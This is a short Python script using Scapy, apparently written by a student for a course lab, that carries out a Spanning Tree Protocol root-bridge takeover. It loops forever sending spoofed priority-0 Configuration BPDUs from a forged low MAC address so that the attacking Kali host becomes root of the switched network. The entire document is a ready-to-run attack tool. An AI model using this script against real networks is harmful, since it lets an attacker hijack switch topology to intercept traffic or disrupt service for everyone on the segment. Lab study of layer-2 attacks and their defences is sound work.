"""
███████╗████████╗██████╗
██╔════╝╚══██╔══╝██╔══██╗
███████╗   ██║   ██████╔╝
╚════██║   ██║   ██╔═══╝
███████║   ██║   ██║
╚══════╝   ╚═╝   ╚═╝

     STP CLAIM ROOT ATTACK TOOL
     Spanning Tree Protocol Exploit

   >> Becoming the Root Bridge like a boss 

   Autor: Cristopher | Mat: 2024-1414
"""


#!/usr/bin/env python3
from scapy.all import *
import time

# --- CONFIGURACIÓN ---
interface = "eth1"
# MAC baja
my_spoofed_mac = "00:00:20:24:14:14"
# ---------------------

print(f"[*] Iniciando Ataque STP Root Bridge en {interface}...")
print(f"[*] Objetivo: Convertir a Kali en el ROOT BRIDGE (Jefe del Switch).")
print("[*] Enviando BPDUs superiores (Prioridad 0)...")

try:
    while True:
        # Construcción del Paquete STP (802.1D Standard)
        # Trama: Ether -> LLC -> STP
        # Destino Multicast STP: 01:80:c2:00:00:00
        
        pkt = Ether(src=my_spoofed_mac, dst="01:80:c2:00:00:00") / \
              LLC(dsap=0x42, ssap=0x42, ctrl=0x03) / \
              STP(bpdutype=0x00,      # Configuration BPDU (0x00)
                  bpduflags=0x00,     # Sin flags especiales
                  rootid=0,           # PRIORIDAD 0 (Invencible)
                  rootmac=my_spoofed_mac,
                  pathcost=0,         # Costo 0 para llegar al root (nosotros)
                  bridgeid=0,         # Nuestra prioridad como puente
                  bridgemac=my_spoofed_mac,
                  portid=0x8002,      # Puerto ficticio
                  age=0,              # Mensaje fresco
                  maxage=20,
                  hellotime=2,
                  fwddelay=15)

        # Enviar paquete
        sendp(pkt, iface=interface, verbose=0)
        
        print(f"\r[+] BPDU enviado: Soy el Root ({my_spoofed_mac})", end="")
        
        # STP estándar envía "Hello" cada 2 segundos.
        # Nosotros podemos enviarlo igual o más rápido para asegurar dominancia.
        time.sleep(2)

except KeyboardInterrupt:
    print("\n\n[!] Ataque detenido o pausado.")   
                                                 
